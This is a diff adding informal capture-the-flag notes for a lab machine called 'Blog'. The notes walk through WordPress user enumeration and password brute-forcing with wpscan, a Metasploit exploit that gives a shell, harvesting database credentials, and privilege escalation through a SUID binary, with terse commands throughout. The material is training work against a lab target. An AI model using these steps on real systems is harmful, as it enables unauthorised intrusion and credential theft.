@@ -453,6 +453,57 @@ MR ROBOT CTF
 	firstboot_done key-3-of-3.txt
 
 ==================================================================================
+#8 Blog
+	nmap scan
+	visit website
+	wpscan --url 10.10.176.147 -e u 
+		Gives user names and wordpress version and potential metasploit module name we can use for exploit
+	save above user lists as user.txt to brute force and get credentials
+
+	wpscan --url 10.10.176.147 -U user.txt -P /path/to/rockyou.txt
+		found password-> Login success into wordpress
+
+	search for wordpress version specific exploits from rapid-7- got
+	spinup msfconsole
+	exploit success with msf
+	>shell
+	>ls
+  -> found config file, cat it and see- got DB credentials
+	login to wordpress with DB credentials
+	
+	>whoami  www-data
+	>cd /home   //found user.txt, cat it for flag (but file content was TRY HARD to get flag)
+	
+	now we goback to meterpreter shell terminal, but in the shell we have not yet got into any user account
+	>cd /tmp (in meterpreter shell terminal)
+	we have to do more enumeration in 2 ways 1) copy linux-smart-enumeration tool into meterpreter shell   //download from https://github.com/diego-treitos/linux-smart-enumeration
+	meterpreter>upload lse.sh
+	meterpreter>shell
+	meterpreter>chmod 755 lse.sh
+	meterpreter>./lse.sh   (password for www-data we dont know , so just press enter to continue)
+
+	From above script, found /usr/sbin/checker has suid permission
+	back to meterpreter shell after exiting from above script scan and execute ./checker to see we are admin or not download same file for more examination
+	
+	meterpreter>download checker
+	
+	after download the file into our local machine, use cutter tool to decode
+	>./cutter and select file to decode, read main code and understand
+	>EXPORT admin=admin
+	>echo $admin
+	meterpreter>./checker   //root
+	now we wre root user
+	>cd /root
+	>cat root.txt    //Found flag
+
+	to get usb flag
+	>cd /
+	>ls  //usb
+	> cd /media/usb
+	>ls //usr.txt  //Found flag
+
+=================================================================================================
+
 
 
 
